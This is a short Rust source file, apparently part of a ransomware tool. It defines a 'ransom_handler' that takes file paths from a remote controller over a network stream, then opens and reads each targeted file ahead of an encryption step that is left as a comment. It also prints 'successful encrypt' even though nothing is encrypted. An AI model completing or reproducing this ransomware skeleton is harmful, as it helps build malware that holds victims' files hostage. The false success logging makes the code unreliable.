use std::{str::from_utf8, sync::Arc};

use tokio::{fs, io::AsyncReadExt, net::tcp::OwnedWriteHalf, sync::{mpsc, Mutex}};

pub async fn ransom_handler(stream_write: Arc<Mutex<OwnedWriteHalf>>, mut stream_read: mpsc::Receiver<Vec<u8>>, key: [u8; 32]) {
    while let Some(path) = stream_read.recv().await {
        println!("got path: {:?}", path);

        let mut plaintext = vec![];

        let path = from_utf8(&path);
        if path.is_err() {
            println!("bad path: {:?}", path);
            continue
        }
        println!("path string: {}", path.unwrap());

        let file = fs::File::options().read(true).open(path.unwrap()).await;
        if file.is_err() {
            println!("file open error: {:?}", file);
            continue
        }

        let file_err = file.unwrap().read_to_end(&mut plaintext).await;
        if file_err.is_err() {
            println!("file read err: {:?}", file_err);
            continue
        }

        println!("successful encrypt at path: {:?}", path.unwrap())

        //encrypt file

    }
}